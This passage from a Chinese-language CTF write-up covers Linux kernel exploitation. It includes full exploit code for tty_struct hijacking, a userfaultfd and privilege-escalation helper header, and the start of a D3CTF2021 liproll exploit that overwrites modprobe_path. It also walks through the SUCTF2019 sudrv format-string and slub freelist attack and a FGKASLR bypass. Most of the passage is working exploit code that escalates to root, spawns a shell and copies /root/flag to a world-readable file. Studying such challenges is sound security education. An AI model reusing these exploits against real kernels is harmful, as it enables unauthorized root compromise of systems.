class="hljs-built_in">memcpy</span>(fake_tty_data, tty_data, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">0x200</span>);<br>    fake_tty_data[<span class="hljs-number">3</span>] = notebook[fake_tty_ops_idx].buf;<br>    fake_tty_data[<span class="hljs-number">4</span>] = prepare_kernel_cred;<br>    fake_tty_data[<span class="hljs-number">5</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">write</span>(note_fd, fake_tty_data, tty_idx);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start prepare_kernel_cred(NULL)...\033[0m&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x80</span>; i++)&#123;<br>        <span class="hljs-built_in">ioctl</span>(tty_fd[i], <span class="hljs-number">233</span>, <span class="hljs-number">233</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">read</span>(note_fd, fake_tty_data, tty_idx);<br><br>    fake_tty_data[<span class="hljs-number">3</span>] = notebook[fake_tty_ops_idx].buf;<br>    fake_tty_data[<span class="hljs-number">4</span>] = commit_creds;<br>    fake_tty_data[<span class="hljs-number">5</span>] = fake_tty_data[<span class="hljs-number">6</span>];<br><br>    <span class="hljs-built_in">write</span>(note_fd, fake_tty_data, tty_idx);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start commit_creds(ROOT)...\033[0m&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x80</span>; i++)<br>        <span class="hljs-built_in">ioctl</span>(tty_fd[i], <span class="hljs-number">233</span>, <span class="hljs-number">233</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[*] Done.\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">getRootShell</span>();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>kernelpwn.h</strong></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><br><span class="hljs-type">void</span> * kernel_base = <span class="hljs-number">0xffffffff81000000</span>;<br><span class="hljs-type">size_t</span> kernel_offset = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">static</span> <span class="hljs-type">pthread_t</span> monitor_thread;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">registerUserFaultFd</span><span class="hljs-params">(<span class="hljs-type">void</span> * addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">void</span>*))</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">long</span> uffd;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffdio_api</span> uffdio_api;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffdio_register</span> uffdio_register;<br>    <span class="hljs-type">int</span> s;<br><br>    <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>    uffd = <span class="hljs-built_in">syscall</span>(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br>    uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>    uffdio_register.range.len = len;<br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>    s = <span class="hljs-built_in">pthread_create</span>(&amp;monitor_thread, <span class="hljs-literal">NULL</span>, handler, (<span class="hljs-type">void</span> *) uffd);<br>    <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>&#125;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">saveStatus</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getRootPrivilige</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-type">void</span> *) = prepare_kernel_cred;<br>    <span class="hljs-built_in">int</span> (*commit_creds_ptr)(<span class="hljs-type">void</span> *) = commit_creds;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;   <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">getuid</span>())<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/* ------ kernel structure ------ */</span><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">file_operations</span>;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">tty_struct</span>;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">tty_driver</span>;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">serial_icounter_struct</span>;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">tty_operations</span> &#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">tty_struct</span> * (*lookup)(<span class="hljs-keyword">struct</span> tty_driver *driver,<br>            <span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">int</span> idx);<br>    <span class="hljs-built_in">int</span>  (*install)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">void</span> (*remove)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">int</span>  (*open)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br>    <span class="hljs-built_in">void</span> (*close)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br>    <span class="hljs-built_in">void</span> (*shutdown)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">void</span> (*cleanup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">int</span>  (*write)(<span class="hljs-keyword">struct</span> tty_struct * tty,<br>              <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">int</span> count);<br>    <span class="hljs-built_in">int</span>  (*put_char)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> ch);<br>    <span class="hljs-built_in">void</span> (*flush_chars)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">int</span>  (*write_room)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">int</span>  (*chars_in_buffer)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">int</span>  (*ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);<br>    <span class="hljs-built_in">long</span> (*compat_ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>                 <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);<br>    <span class="hljs-built_in">void</span> (*set_termios)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> ktermios * old);<br>    <span class="hljs-built_in">void</span> (*throttle)(<span class="hljs-keyword">struct</span> tty_struct * tty);<br>    <span class="hljs-built_in">void</span> (*unthrottle)(<span class="hljs-keyword">struct</span> tty_struct * tty);<br>    <span class="hljs-built_in">void</span> (*stop)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">void</span> (*start)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">void</span> (*hangup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">int</span> (*break_ctl)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> state);<br>    <span class="hljs-built_in">void</span> (*flush_buffer)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">void</span> (*set_ldisc)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">void</span> (*wait_until_sent)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> timeout);<br>    <span class="hljs-built_in">void</span> (*send_xchar)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">char</span> ch);<br>    <span class="hljs-built_in">int</span> (*tiocmget)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-built_in">int</span> (*tiocmset)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> set, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> clear);<br>    <span class="hljs-built_in">int</span> (*resize)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> winsize *ws);<br>    <span class="hljs-built_in">int</span> (*set_termiox)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> termiox *tnew);<br>    <span class="hljs-built_in">int</span> (*get_icount)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>                <span class="hljs-keyword">struct</span> serial_icounter_struct *icount);<br>    <span class="hljs-built_in">void</span> (*show_fdinfo)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> seq_file *m);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span><br>    <span class="hljs-built_in">int</span> (*poll_init)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> *options);<br>    <span class="hljs-built_in">int</span> (*poll_get_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line);<br>    <span class="hljs-built_in">void</span> (*poll_put_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> ch);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">file_operations</span> *proc_fops;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="从SUCTF2019sudrv学习slub和modprobe-path"><a href="#从SUCTF2019sudrv学习slub和modprobe-path" class="headerlink" title="从SUCTF2019sudrv学习slub和modprobe_path"></a>从SUCTF2019sudrv学习slub和modprobe_path</h2><p>建议第一次入门接触slub的师傅们先看一下<a href="https://blog.csdn.net/lukuen/article/details/6935068">linux 内核 内存管理 slub算法 （一） 原理</a>讲的非常详细，看完之后可以更好地理解本文的利用手法。</p><p>先来分析一下存在漏洞的驱动程序。<br>首先来看一下sudrv_ioctl函数，给不同的参数，分别执行申请、打印以及释放的功能。释放时将指针置空，不存在UAF漏洞。<br><img src="https://i.imgur.com/lbwVjtl.png"><br>在cmd&#x3D;0xdeadbeef时，会执行打印功能，也就是sudrv_ioctl_cold_2函数。这里出现格式化字符串漏洞。<br><img src="https://i.imgur.com/RFmylk0.png"><br>在sudrv_write函数中，copy_user_generic_unrolled函数不会检查size的大小，因此可以往su_buf写入大于su_buf大小的内容。<br><img src="https://i.imgur.com/NJfAzym.png"></p><h4 id="主要思路-1"><a href="#主要思路-1" class="headerlink" title="主要思路"></a>主要思路</h4><p>因为开启了kaslr，所以需要泄露内核的加载基址，执行rop的时候需要将rop写到write函数的返回地址上，因此也需要泄露栈地址。在调用printk时出现格式化字符串漏洞，栈上刚好放着内核地址和栈地址<br><img src="https://i.imgur.com/KXoKU0N.png"></p><p>因此本题的思路为：<br>1、通过printk格式化字符串漏洞泄露内核加载地址以及栈地址<br>2、通过越界写漏洞覆盖freelist的next指针为write函数的返回地址<br>3、将rop写到write函数的返回地址上</p><h2 id="从D3CTF2021-liproll学习FGKASLR"><a href="#从D3CTF2021-liproll学习FGKASLR" class="headerlink" title="从D3CTF2021 liproll学习FGKASLR"></a>从D3CTF2021 liproll学习FGKASLR</h2><p>可以根据<a href="https://blog.wjhwjhn.com/archives/829/">wjh师傅</a>的这篇博客来学习一下FGKASLR以及内核的其他防护。</p><blockquote><p>FGKASLR 在 KASLR 基地址随机化的基础上，在加载时刻，以函数粒度重新排布内核代码。</p></blockquote><p>大概意思就是有些函数的偏移不再是固定的偏移，因此确定内核基址比较困难。但是还是有一部分节区或者gadget没有被细粒度随机化，所以可以多泄露几次内存，比较泄露两次内存中后三位不发生改变的内核地址，通过这个地址泄露内核基地址，并且modprobe_path的地址不会被随机化，所以用modprobe的利用手法比较简单。</p><p>首先来分析一下程序，我们可以看到这个函数中存在栈溢出，v1是我们传入的数据，没有限制大小，而v5在栈上，因此栈溢出越界写写到v6中去，在程序的最后会重新将v6赋给全局变量global_buffer，因此可以将global_buffer修改为我们想要的地址。重新调用这个函数就可以在memcpy处将我们想要的数据填入到我们想要的地址上。<br><img src="https://i.imgur.com/Q5bMSpL.png"></p><p>而在这个函数中存在越界读漏洞，因为传入的a3没有限制大小<br><img src="https://i.imgur.com/XR0jhW5.png"></p><p>因此我们的思路是通过越界读确定内核基址，然后将global_buffer改为modprobe_path的地址，然后再修改modprobe_path的值为我们写的脚本，执行未知格式文件即可执行我们写的脚本。</p><p>常规查看modprobe_path的思路是<br><img src="https://i.imgur.com/vN8vOyv.png"><br>但是有些内核没有modprobe_path的符号可以通过__request_module函数找到其地址，通过cmp这一行可以确定modprobe_path的地址<br><img src="https://i.imgur.com/yy63buw.png"></p><p><img src="https://i.imgur.com/bDOvNwG.png"></p><p><img src="https://i.imgur.com/hWrcv9f.png"></p><p>写的exp不稳定，特别容易崩，并且还不知道如何查看是否开启FGASLR，有知道的师傅可以联系我。<br>exp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">save_stat</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">asm</span>(<br>        <span class="hljs-string">&quot;movq %%cs, %0;&quot;</span><br>        <span class="hljs-string">&quot;movq %%ss, %1;&quot;</span><br>        <span class="hljs-string">&quot;movq %%rsp, %2;&quot;</span><br>        <span class="hljs-string">&quot;pushfq;&quot;</span><br>        <span class="hljs-string">&quot;popq %3;&quot;</span><br>        : <span class="hljs-string">&quot;=r&quot;</span> (user_cs), <span class="hljs-string">&quot;=r&quot;</span> (user_ss), <span class="hljs-string">&quot;=r&quot;</span> (user_sp), <span class="hljs-string">&quot;=r&quot;</span> (user_rflags) : : <span class="hljs-string">&quot;memory&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">shell</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">node</span>&#123;<br><span class="hljs-type">void</span> *buf;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len;<br>&#125;;<br><br><span class="hljs-type">int</span> fd;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">add</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">ioctl</span>(fd, <span class="hljs-number">0xd3c7f03</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">choose</span><span class="hljs-params">(<span class="hljs-type">int</span> idx)</span></span>&#123;<br>    <span class="hljs-type">int</span> *idxp = &amp;idx;<br>    <span class="hljs-built_in">ioctl</span>(fd, <span class="hljs-number">0xd3c7f04</span>, idxp);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> node *nodep)</span></span>&#123;<br>    <span class="hljs-built_in">ioctl</span>(fd, <span class="hljs-number">0xd3c7f01</span>, nodep);<br>&#125;<br><br><span class="hljs-type">char</span> data[<span class="hljs-number">0x300</span>];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">signal</span>(SIGSEGV, shell);<br>    <span class="hljs-built_in">save_stat</span>();<br><br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /root/flag /tmp/flag\n/bin/chmod 777 /tmp/flag\n&#x27; &gt; /tmp/chflag&quot;</span>);<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;chmod +x /tmp/chflag&quot;</span>);<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;echo -ne &#x27;\xff\xff\xff\xff&#x27; &gt; /tmp/aaa&quot;</span>);<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;chmod +x /tmp/aaa&quot;</span>);<br><br>    fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/liproll&quot;</span>,<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] bad open device\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]open drive\n&quot;</span>);<br><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">node</span> node1;<br>    node1.buf = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    node1.len = <span class="hljs-number">0x108</span>;<br><br>    <span class="hljs-built_in">add</span>();<br>    <span class="hljs-built_in">choose</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">read</span>(fd, data, <span class="hljs-number">0x300</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Leak address: \n&quot;</span>);<br>    <span 